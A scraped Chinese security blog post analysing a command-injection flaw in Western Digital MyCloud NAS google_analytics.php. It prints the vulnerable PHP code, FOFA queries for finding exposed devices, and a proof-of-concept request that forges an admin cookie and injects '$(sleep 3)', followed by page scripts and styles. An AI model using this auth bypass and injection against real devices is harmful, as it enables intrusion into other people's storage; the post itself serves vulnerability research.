---
title: "西部数码 NAS google_analytics.php 命令执行漏洞"
source: https://mrxn.net/jswz/west-nas-google_analytics-rce.html
asset_dir: assets/西部数码-nas-google_analytics.php-命令执行漏洞
---

# 西部数码 NAS google\_analytics.php 命令执行漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/9/6 13:40
* 1463浏览
* [0评论](#comment)
* 14分钟阅读

深入探索

软件

Western Digital

滙豐卡$2000減$150 WD 3.5吋 4TB My Cloud Home 網絡儲存裝置 wdbvxc0040hwt 香港行貨


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

Western Digital MyCloud NAS是一款网络附加存储设备，旨在提供集中存储和共享解决方案。它允许用户在家中或办公室通过网络访问文件，支持多种设备的备份和共享。Western Digital MyCloud NAS google\_analytics.php中存在[命令执行](https://mrxn.net/tag/rce)漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。

网络统计与分析

# 影响版本

<=2.11.153（老版本，已发布修复补丁）

# fofa语法

> icon\_hash="-1074357885" && header="X-Powered-By: PHP/5.4.16"
>
> body="\_PROJECT\_MODEL\_ID\_YOSEMITE " && body="\_PROJECT\_MODEL\_ID\_LIGHTNING "

# 漏洞分析

直接看 `google_analytics.php` 其业务实现逻辑如下

```
<?php
session_start();
$r = new stdClass();
$r->success = false;
include ("./lib/login_checker.php");

/* login_check() return 0: no login, 1: login, admin, 2: login, normal user */
if (login_check()==0)
{
    echo json_encode($r);
    exit;
}

$action = $_POST['cmd'];
if ($action == "") $action = $_GET['cmd'];

$r = new stdClass();
switch ($action)
{
    case "set":
    {
       $opt = $_POST['opt'];
       $arg = $_POST['arg'];
       $run_cmd = sprintf("ganalytics --%s %s > /dev/null &", $opt, ($arg != "") ? $arg : "");

       system($run_cmd);

       $r->run_cmd = $run_cmd;
       $r->success = true;
       echo json_encode($r);
    }
    break; 
}
?>
```

深入探索

安全研究工具

数据库

安全工具开发

当`cmd=set`时，从请求中获取 `opt` 和 `arg` 参数，在未进行任何过滤或转义的情况下，直接将其拼接到 $run\_cmd中，然后用`system()` 函数执行的系统命令中，导致了[命令注入](https://mrxn.net/tag/rce)漏洞。尽管此漏洞需要管理员权限才能触发，但可以结合`login_check`的权限绕过达到 RCE的效果。

漏洞修复方案

# 漏洞复现

```
GET /web/google_analytics.php HTTP/1.1
Host: west-nas.mrxn.ent
Cookie: isAdmin=1;username=admin

cmd=set&opt=$(sleep 3)
```

[![西部数码 NAS google_analytics.php 命令执行漏洞](images/img-001-71d844707132.webp)](https://image.mrxn.net/fd549b518eaf4efb97b41d4ecf047d9b.webp)

成功延时 3 秒

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#php](https://mrxn.net/tag/php)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#rce](https://mrxn.net/tag/rce)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[西部数码 NAS google\_analytics.php 命令执行漏洞](https://mrxn.net/jswz/west-nas-google_analytics-rce.html)  
文章链接：<https://mrxn.net/jswz/west-nas-google_analytics-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

硬盘驱动器

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/west-nas-google\_analytics-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

网络存储

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/west-nas-google\_analytics-rce.html"),
width: 100,
height: 100,
